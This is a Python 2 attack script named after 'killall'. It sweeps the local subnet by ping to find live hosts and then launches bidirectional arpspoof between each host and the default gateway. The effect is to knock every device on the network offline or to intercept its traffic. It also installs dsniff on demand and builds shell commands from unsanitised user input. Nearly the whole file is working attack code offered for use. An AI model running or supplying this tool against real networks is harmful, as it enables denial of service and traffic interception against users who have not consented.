# conding: utf-8

# Codded by: @i127001
# Twitter: https://twitter.com/i127001
# Requirements library: command, multiprocessing
# Requirements packages: dsniff

from time import sleep
import commands as cm
import multiprocessing as mp
import socket
import os

ips_file_path = '/home/i127001/.killall_ips.txt'


class Scan():

    def __init__(self):
        try:
            self.ips_file_path = ips_file_path
            f = open(self.ips_file_path, 'w')
            f.write('')
            f.close()
            print('\n')
            print('# Codded by: @i127001')
            print('# Twitter: https://twitter.com/i127001')
            new_file = cm.getstatusoutput('echo "" > /root/Kj_test_YB34gnjcdvkndhb_temp_.txt')
            if('denied' in new_file[1].lower()):
                print("\nYou must be a sudo or su\n")
                print("\n\nExited \n-------\n")
                exit()
            else:
                os.system('sudo rm /root/Kj_test_YB34gnjcdvkndhb_temp_.txt')
                check_arp = cm.getstatusoutput('sudo arpspoof -h')
                if('command not found' in check_arp[1].lower()):
                    uo = raw_input('arpspoof command not found, Download it? [Y/n]: ')
                    if(uo.lower() == 'y'):
                        my_sys = raw_input('Your system based on ? [1 for arch], [2 for debian]: ')
                        if(my_sys.lower() == '1'):
                            download_command = 'sudo pacman -S dsniff'
                        elif(my_sys.lower() == '2'):
                            download_command = 'sudo apt-get install dsniff'
                        else:
                            print("You need to insert 1 or 2")
                            print("\n\nExited \n-------\n")
                            exit()
                        os.system(download_command)
                    else:
                        print("\n\nExited \n-------\n")
                        exit()
                self.default_ip = raw_input('\n-------\n\nInsert [default getway IP]: ')
                check_resp = cm.getstatusoutput('ping ' + self.default_ip + ' -c 1')
                if(check_resp[0] == 512):
                    print("\n\nIP: '" + self.default_ip + "' Not response!\n")
                    exit()
                print('\n-------\nTo exit from this session press Ctrl-c\n-------\n')
                self.my_ip = socket.gethostbyname(socket.gethostname())
                self.ip_with_out_last_number = self.default_ip[:self.default_ip.find('.', 8) + 1]
                self.my_ip_end = self.my_ip[self.default_ip.find('.', 8) + 1:]
                self.end_default = self.default_ip[self.default_ip.find('.', 8) + 1:]
        except Exception as e:  # noqa
            # print(e)
            cm.getstatusoutput('sudo killall arpspoof ')
            exit()

    def scan(self, ip):
        result = cm.getstatusoutput('ping "' + ip + '" -c 1 -b')
        if(result[0] == 0 and ip != self.my_ip and ip != self.default_ip):
            print 'Found: ' + ip
            f = open(self.ips_file_path, 'a')
            f.write(ip + '\n')
        if(self.ip_with_out_last_number + str(254) in result[1]):
            sleep(7)
            self.kill_all()

    def do_scan(self):
        for i in range(1, 255):
            ip = self.ip_with_out_last_number + str(i)
            mp.Process(target=self.scan, args=([ip])).start()

    def kill_all(self):
        def kill_ip(ip):
                print('Killing ' + ip)
                os.system('sudo arpspoof -t ' + ip + " " + self.default_ip + " &")
                os.system('sudo arpspoof -t ' + self.default_ip + " " + ip + " &")
        f = open(self.ips_file_path, 'r')
        ips = f.read()
        ips = ips.split('\n')
        ips.remove('')
        try:
            for ip in ips:
                try:
                    mp.Process(target=kill_ip, args=([ip])).start()
                except:
                    cm.getstatusoutput('sudo killall arpspoof ')
                    exit()
        except Exception as e:  # noqa
            # print(e)
            cm.getstatusoutput('sudo killall arpspoof ')
            exit()


try:
    scan = Scan()
    print("Scanning...")
    scan.do_scan()
    op = raw_input()
except Exception as e:  # noqa
    # print(e)
    cm.getstatusoutput('sudo killall arpspoof ')
    exit()
except KeyboardInterrupt:
    cm.getstatusoutput('sudo killall arpspoof ')
    exit()
